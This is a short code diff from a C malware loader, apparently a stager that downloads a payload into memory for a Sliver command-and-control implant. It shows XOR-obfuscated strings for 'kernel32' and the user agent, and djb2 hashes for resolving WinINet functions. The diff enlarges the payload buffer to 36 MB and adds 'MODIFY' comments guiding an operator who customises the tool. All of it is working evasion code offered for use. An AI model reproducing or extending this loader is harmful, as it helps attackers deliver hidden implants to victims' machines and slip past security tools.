@@ -19,10 +19,10 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
     
     // using "Mozilla/5.0" as user agent
+    // MODIFY: use string_encryptor.py to change user agent
     char enc_user_agent[] = { 0x12, 0x1c, 0x0f, 0x19, 0x5f, 0x1f, 0x52, 0x4c, 0x47, 0x1d, 0x44, 0x6b };
 
     // API hashes
-    // NOTE: calculate these using hasher.py
     DWORD hash_IntOpen = 0xF4AD70A1;      // djb2 for "InternetOpenA"
     DWORD hash_IntOpenUrl = 0x8F5CA3B4;   // djb2 for "InternetOpenUrlA"
     DWORD hash_IntReadFile = 0xFB4F8EAA;  // djb2 for "InternetReadFile"
@@ -79,9 +79,8 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
         return NULL;
     }
 
-    // prepare memory buffer to hold payload (4 MB)
-    // SIZE_T buffer_size = 4 * 1024 * 1024; 
-    // new memory buffer - sliver payload (36 MB)
+    // prepare memory buffer to hold payload (36 MB)
+    // MODIFY: increment buffer size if payload is bigger
     SIZE_T buffer_size = 36 * 1024 * 1024;
     
     // use dynamically resolved VirtualAlloc
